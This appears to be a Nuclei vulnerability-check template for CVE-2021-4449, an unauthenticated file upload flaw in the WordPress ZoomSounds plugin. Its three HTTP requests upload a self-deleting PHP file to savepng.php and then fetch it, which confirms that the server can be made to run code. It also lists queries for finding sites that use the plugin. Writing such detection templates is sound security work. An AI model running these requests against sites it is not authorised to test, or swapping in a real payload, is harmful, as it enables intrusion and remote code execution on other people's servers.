id: CVE-2021-4449

info:
  name: WordPress ZoomSounds <=5.96 - Unauthenticated Arbitrary File Upload
  author: princechaddha
  severity: critical
  description: |
    ZoomSounds plugin for WordPress versions up to 5.96 contains a file upload vulnerability caused by missing file type validation in 'savepng.php', letting unauthenticated attackers upload arbitrary files, exploit requires no authentication. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.
  reference:
    - https://sploitus.com/exploit?id=WPEX-ID:07259A61-8BA9-4DD0-8D52-CC1DF389C0AD
    - https://wpscan.com/vulnerability/07259a61-8ba9-4dd0-8d52-cc1df389c0ad
    - https://nvd.nist.gov/vuln/detail/CVE-2021-4449
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-4449
    cwe-id: CWE-434
    cpe: cpe:2.3:a:digitalzoomstudio:zoomsounds:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: digitalzoomstudio
    product: zoomsounds
    framework: wordpress
    publicwww-query: "/wp-content/plugins/dzs-zoomsounds/"
    fofa-query: body="/wp-content/plugins/dzs-zoomsounds/"
  tags: cve,cve2021,wordpress,wp-plugin,zoomsounds,file-upload,intrusive,digitalzoomstudio,kev,vuln

variables:
  filename: "{{rand_base(8)}}"
  teststring: "nuclei-zoomsounds-{{rand_base(10)}}"

flow: |
  http(1) && http(2) && http(3)

http:
  - raw:
      - |
        GET /wp-content/plugins/dzs-zoomsounds/savepng.php HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code != 404'
        condition: and
        internal: true

  - raw:
      - |
        POST /wp-content/plugins/dzs-zoomsounds/savepng.php?location={{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: en-GB,en;q=0.5
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest

        <?php echo "{{teststring}}";unlink(__FILE__);?>

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 || status_code == 201'
        condition: and
        internal: true

  - raw:
      - |
        GET /wp-content/plugins/dzs-zoomsounds/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{{teststring}}'

      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - 'contains(content_type, "text/html") || contains(content_type, "application/x-httpd-php") || contains(content_type, "text/plain")'
# digest: 

